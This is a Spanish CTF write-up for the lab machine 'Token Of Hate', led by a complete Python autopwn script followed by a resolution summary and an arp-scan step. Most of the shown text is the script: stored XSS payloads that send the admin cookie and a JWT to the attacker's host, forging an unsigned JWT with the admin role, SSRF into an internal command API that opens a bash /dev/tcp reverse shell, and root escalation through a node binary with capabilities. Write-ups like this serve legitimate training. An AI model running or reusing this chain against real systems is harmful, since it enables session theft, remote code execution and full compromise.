---
title: "Token Of Hate"
date: 2025-03-16 00:00:00 +0800
categories: writeups thehackerslabs
tags: autopwn máquina linux cookiehijacking jwt capabilities rce xss ssrf lfi javascript scripting apiabuse api
description: Writeup de la máquina Token Of Hate de TheHackersLabs.
image: ../assets/images/posts/logos/thehackerslabs.png
---

## Autopwned

<details>
    <summary>Click para ver el autopwned</summary>
<div class="language-python highlighter-rouge">
   <div class="code-header">
      <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
   </div>
   <div class="highlight">
      <code>
         <table class="rouge-table">
            <tbody>
               <tr style="background-color: #151515;">
                  <td class="rouge-gutter gl">
                     <pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
</pre>
                  </td>
                  <td class="rouge-code">
                     <pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="c1"># Author: Álvaro Bernal (aka. trr0r)
</span>
<span class="kn">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">logging</span><span class="p">,</span> <span class="n">json</span><span class="p">,</span> <span class="n">jwt</span><span class="p">,</span> <span class="n">keyboard</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
<span class="kn">from</span> <span class="n">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
<span class="kn">from</span> <span class="n">multiprocessing</span> <span class="kn">import</span> <span class="n">Process</span><span class="p">,</span> <span class="n">Queue</span>
<span class="kn">from</span> <span class="n">werkzeug</span> <span class="kn">import</span> <span class="n">Request</span><span class="p">,</span> <span class="n">Response</span><span class="p">,</span> <span class="n">run_simple</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64encode</span><span class="p">,</span> <span class="n">b64decode</span>

<span class="n">PORT</span> <span class="o">=</span> <span class="mi">80</span>
<span class="n">LISTEN_NC</span> <span class="o">=</span> <span class="mi">443</span>
<span class="n">target_ip</span> <span class="o">=</span> <span class="sh">""</span>
<span class="n">host_ip</span> <span class="o">=</span> <span class="sh">""</span>

<span class="n">payload_cmd</span> <span class="o">=</span><span class="sh">'''</span><span class="s">x=new XMLHttpRequest;x.onload=()=&gt;new Image().src=</span><span class="sh">"</span><span class="s">http://%s:%i/?i=</span><span class="sh">"</span><span class="s">+btoa(x.responseText);x.open(</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">http://localhost:3000/command</span><span class="sh">"</span><span class="s">);x.setRequestHeader(</span><span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span><span class="s">);x.send(</span><span class="sh">'</span><span class="s">{</span><span class="sh">"</span><span class="s">command</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">bash -c </span><span class="se">\\</span><span class="sh">'</span><span class="s">bash -i &gt;&amp; /dev/tcp/%s/%i 0&gt;&amp;1</span><span class="se">\\</span><span class="sh">'"</span><span class="s">, </span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s">}</span><span class="sh">'</span><span class="s">)</span><span class="sh">'''</span>

<span class="n">payload_token</span> <span class="o">=</span><span class="sh">'''</span><span class="s">x=new XMLHttpRequest;x.onload=()=&gt;new Image().src=</span><span class="sh">"</span><span class="s">http://%s:%i/info?i=</span><span class="sh">"</span><span class="s">+btoa(x.responseText);x.open(</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">http://localhost:3000/login</span><span class="sh">"</span><span class="s">);x.setRequestHeader(</span><span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span><span class="s">);x.send(</span><span class="sh">'</span><span class="s">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">Jose</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">FuLqqEAErWQsmTQQQhsb</span><span class="sh">"</span><span class="s">}</span><span class="sh">'</span><span class="s">)</span><span class="sh">'''</span>

<span class="c1"># Ocultar el output
</span><span class="n">loger</span> <span class="o">=</span> <span class="n">logging</span><span class="p">.</span><span class="nf">getLogger</span><span class="p">(</span><span class="sh">'</span><span class="s">werkzeug</span><span class="sh">'</span><span class="p">)</span>
<span class="n">loger</span><span class="p">.</span><span class="nf">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="p">.</span><span class="n">ERROR</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_ip</span><span class="p">():</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="se">\n\t</span><span class="s">[+] Uso: validation_autopwn.py target_ip host_ip</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">))</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">[</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]]</span>

<span class="k">def</span> <span class="nf">ctrl_c</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">event</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[!] Saliendo ...</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">red</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">ctrl_c</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">check_connect</span><span class="p">():</span>
    <span class="n">resultado</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="sh">"</span><span class="s">timeout</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ping</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-c</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">resultado</span><span class="p">.</span><span class="n">returncode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[!] No tienes conectividad con la máquina víctima</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">red</span><span class="sh">'</span><span class="p">))</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">inject_cookie</span><span class="p">():</span>
    <span class="n">main_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://</span><span class="si">{</span><span class="n">target_ip</span><span class="si">}</span><span class="s">/procesarRegistro.php</span><span class="sh">"</span>
    <span class="n">body_request</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">username</span><span class="sh">"</span> <span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">＜script＞let img＝document．createElement（＂img＂）；img．src＝＂http：／／</span><span class="si">{</span><span class="n">host_ip</span><span class="si">}</span><span class="s">：</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s">／?cookie=＂+document．cookie＜／script＞</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">password</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">"</span><span class="s">pwned</span><span class="sh">"</span>
    <span class="p">}</span>
    <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">body_request</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">cookie_hijacking</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea simulado ya que el \n en el log.progress se bugea
</span>    <span class="n">cookie_log</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="s">Capturando la cookie del admin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">server</span><span class="p">:</span>
        <span class="n">server</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">server</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="n">host_ip</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>

        <span class="n">server</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">client</span><span class="p">,</span> <span class="n">client_addr</span> <span class="o">=</span> <span class="n">server</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
            <span class="n">request</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">if</span> <span class="sh">"</span><span class="s">GET /?cookie</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">request</span> <span class="ow">and</span> <span class="n">target_ip</span> <span class="o">==</span> <span class="n">client_addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
                <span class="n">cookie</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">splitlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">PHPSESSID=</span><span class="sh">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
                <span class="n">cookie_log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Cookie del usuario admin capturada, </span><span class="se">\"</span><span class="si">{</span><span class="n">cookie</span><span class="si">}</span><span class="se">\"</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">green</span><span class="sh">'</span><span class="p">))</span>
                <span class="k">break</span>
    <span class="k">return</span> <span class="n">cookie</span>

<span class="k">def</span> <span class="nf">inject_token</span><span class="p">():</span>
    <span class="n">main_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://</span><span class="si">{</span><span class="n">target_ip</span><span class="si">}</span><span class="s">/procesarRegistro.php</span><span class="sh">"</span>
    <span class="n">body_request</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">username</span><span class="sh">"</span> <span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">＜script ｓｒｃ＝＂http：／／192.168.26.10:80／pwned．js＂＞＜／script＞</span><span class="sh">"</span><span class="p">,</span>
        <span class="sh">"</span><span class="s">password</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">"</span><span class="s">pwned2</span><span class="sh">"</span>
    <span class="p">}</span>
    <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">body_request</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">get_token</span><span class="p">(</span><span class="n">q</span><span class="p">:</span> <span class="n">Queue</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="nd">@Request.application</span>
    <span class="k">def</span> <span class="nf">app</span><span class="p">(</span><span class="n">request</span><span class="p">:</span> <span class="n">Request</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Response</span><span class="p">:</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">strip</span><span class="p">().</span><span class="nf">lower</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">path</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">"</span><span class="s">/pwned.js</span><span class="sh">"</span><span class="p">):</span>
            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">./pwned.js</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">js_content</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
            <span class="k">return</span>  <span class="nc">Response</span><span class="p">(</span><span class="n">js_content</span><span class="p">,</span> <span class="n">content_type</span><span class="o">=</span><span class="sh">'</span><span class="s">application/javascript</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">path</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">"</span><span class="s">/info</span><span class="sh">"</span><span class="p">):</span>
            <span class="k">if</span> <span class="sh">"</span><span class="s">i</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">:</span>  <span class="c1"># Aseguramos que el parámetro "i" esté presente
</span>                <span class="n">q</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="sh">"</span><span class="s">i</span><span class="sh">"</span><span class="p">])</span>  <span class="c1"># Poner el token en la cola
</span>        <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="sh">""</span><span class="p">,</span> <span class="mi">204</span><span class="p">)</span>

    <span class="nf">run_simple</span><span class="p">(</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>  <span class="c1"># Iniciar el servidor en 0.0.0.0:PORT
</span>
<span class="k">def</span> <span class="nf">run_flask_token</span><span class="p">():</span>
    <span class="n">q</span> <span class="o">=</span> <span class="nc">Queue</span><span class="p">()</span>
    <span class="n">p</span> <span class="o">=</span> <span class="nc">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">get_token</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="p">,))</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea simulado ya que el \n en el log.progress se bugea
</span>    <span class="n">token_log</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="s">Capturando el token del usuario Jose</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">q</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">block</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>  <span class="c1"># Esperar el token desde la cola
</span>    <span class="n">token_log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Token del usuario Jose captuado, </span><span class="se">\"</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="se">\"</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">green</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">terminate</span><span class="p">()</span>  <span class="c1"># Terminar el servidor Flask
</span>    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="nf">decode</span><span class="p">())[</span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">],</span> <span class="n">options</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">verify_signature</span><span class="sh">"</span><span class="p">:</span> <span class="bp">False</span><span class="p">})</span>
    <span class="n">token</span><span class="p">[</span><span class="sh">"</span><span class="s">role</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">"</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="sh">"</span><span class="s">none</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">token</span>

<span class="k">def</span> <span class="nf">get_cmd</span><span class="p">(</span><span class="n">q</span><span class="p">:</span> <span class="n">Queue</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="nd">@Request.application</span>
    <span class="k">def</span> <span class="nf">app</span><span class="p">(</span><span class="n">request</span><span class="p">:</span> <span class="n">Request</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Response</span><span class="p">:</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">strip</span><span class="p">().</span><span class="nf">lower</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">path</span><span class="p">.</span><span class="nf">endswith</span><span class="p">(</span><span class="sh">"</span><span class="s">/pwned.js</span><span class="sh">"</span><span class="p">):</span>
            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">./pwned.js</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">js_content</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
            <span class="n">q</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
            <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="n">js_content</span><span class="p">,</span> <span class="n">content_type</span><span class="o">=</span><span class="sh">'</span><span class="s">application/javascript</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="sh">""</span><span class="p">,</span> <span class="mi">204</span><span class="p">)</span>


    <span class="nf">run_simple</span><span class="p">(</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>  <span class="c1"># Iniciar el servidor en 0.0.0.0:PORT
</span>
<span class="k">def</span> <span class="nf">run_flask_cmd</span><span class="p">():</span>
    <span class="n">q</span> <span class="o">=</span> <span class="nc">Queue</span><span class="p">()</span>
    <span class="n">p</span> <span class="o">=</span> <span class="nc">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">get_cmd</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="p">,))</span>
    <span class="n">p</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea simulado ya que el \n en el log.progress se bugea
</span>    <span class="n">token_log</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="nf">colored</span><span class="p">(</span><span class="sh">"</span><span class="s">Esperando a que el admin visite la página para que nos envie la Reverse Shell</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">blue</span><span class="sh">'</span><span class="p">))</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span> <span class="c1"># Salto de línea simulado ya que el \n en el log.progress se bugea
</span>
    <span class="nf">listening</span><span class="p">()</span> <span class="c1"># Nos ponemos en escucha
</span>
    <span class="n">q</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">block</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>  <span class="c1"># Esperar a que se realize la petición a /pwned.js
</span>    <span class="n">p</span><span class="p">.</span><span class="nf">terminate</span><span class="p">()</span>  <span class="c1"># Terminar el servidor Flask
</span>
<span class="k">def</span> <span class="nf">write_pwned_js</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="nb">type</span><span class="p">):</span>

    <span class="k">if</span> <span class="nb">type</span> <span class="o">==</span> <span class="sh">"</span><span class="s">t</span><span class="sh">"</span><span class="p">:</span>
        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">pwned.js</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">content</span> <span class="o">%</span> <span class="p">(</span><span class="n">host_ip</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
    <span class="k">elif</span> <span class="nb">type</span> <span class="o">==</span> <span class="sh">"</span><span class="s">c</span><span class="sh">"</span><span class="p">:</span>
        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">pwned.js</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">content</span> <span class="o">%</span> <span class="p">(</span><span class="n">host_ip</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">host_ip</span><span class="p">,</span> <span class="n">LISTEN_NC</span><span class="p">,</span> <span class="n">token</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">listening</span><span class="p">():</span>
    <span class="n">listener</span> <span class="o">=</span> <span class="nf">listen</span><span class="p">(</span><span class="n">LISTEN_NC</span><span class="p">)</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="n">listener</span><span class="p">.</span><span class="nf">wait_for_connection</span><span class="p">()</span>

    <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span> <span class="c1"># Recibimos el primer banner
</span>    <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span> <span class="c1"># Recibimos el segundo banner
</span>    <span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"""</span><span class="s">/usr/bin/yournode -e </span><span class="sh">'</span><span class="s">process.setuid(0); require(</span><span class="sh">"</span><span class="s">child_process</span><span class="sh">"</span><span class="s">).spawn(</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="s">, {stdio: [0, 1, 2]})</span><span class="sh">'"""</span><span class="p">)</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">().</span><span class="nf">decode</span><span class="p">()</span> <span class="c1"># Recibimos el output del comando anterior
</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"""</span><span class="s">echo </span><span class="sh">"</span><span class="s">User Flag -&gt; `cat /home/ctesias/user.txt`</span><span class="sh">"</span><span class="s"> </span><span class="sh">"""</span><span class="p">)</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"""</span><span class="s">echo </span><span class="sh">"</span><span class="s">Root Flag -&gt; `cat /root/root.txt`</span><span class="sh">"</span><span class="s"> </span><span class="sh">"""</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">().</span><span class="nf">decode</span><span class="p">())</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">().</span><span class="nf">decode</span><span class="p">())</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">().</span><span class="nf">decode</span><span class="p">())</span>

    <span class="n">conn</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">target_ip</span><span class="p">,</span> <span class="n">host_ip</span> <span class="o">=</span> <span class="nf">get_ip</span><span class="p">()</span>
    <span class="nf">check_connect</span><span class="p">()</span>

    <span class="c1"># Operativas innecesarias pero se han realizado por puro aprendizaje
</span>    <span class="c1">#inject_cookie()
</span>    <span class="c1">#cookie = cookie_hijacking()
</span>
    <span class="nf">inject_token</span><span class="p">()</span>
    <span class="nf">write_pwned_js</span><span class="p">(</span><span class="n">payload_token</span><span class="p">,</span> <span class="sh">"</span><span class="s">t</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">token</span> <span class="o">=</span> <span class="nf">run_flask_token</span><span class="p">()</span>
    <span class="nf">write_pwned_js</span><span class="p">(</span><span class="n">payload_cmd</span><span class="p">,</span> <span class="sh">"</span><span class="s">c</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">run_flask_cmd</span><span class="p">()</span>
</pre>
                  </td>
               </tr>
            </tbody>
         </table>
      </code>
   </div>
</div>
</details>
---
## Resumen de la resolución

**Token Of Hate** es una máquina **Linux** de dificultad <strong style="color: firebrick">Insane</strong> (**Experto**) de la plataforma de **TheHackersLabs**. Es una máquina que explota diversas vulnerabilidades web, veremos como conseguiremos robarle la cookie al admin lo que nos permite acceder a la sección de administración, en la cual podemos generar archivos **PDFs**. Dicha generación de archivos **PDFs**, nos permitirán explotar un SSRF para acceder a una **API** interna a través de la cual podemos ejecutar comandos remotamente. Finalmente, aprovechamos una capability en una copia del binario **node** para escalar privilegios y obtener acceso como **root**.

---
## Enumeración

En primer lugar, realizaremos un barrido en la red para encontrar la **Dirección IP** de la máquina víctima, para ello usaremos el siguiente comando.

```bash
arp-scan -I ens33 --localnet
```

A continuación podemos ver la **Dirección IP** ya que el **OUI** es **08:00:27**, correspondiente a una máquina virtual de **Virtual Box**.

![](<../assets/images/posts/2025-03-16-tokenofhate/Pasted image 20250315113137.png>)

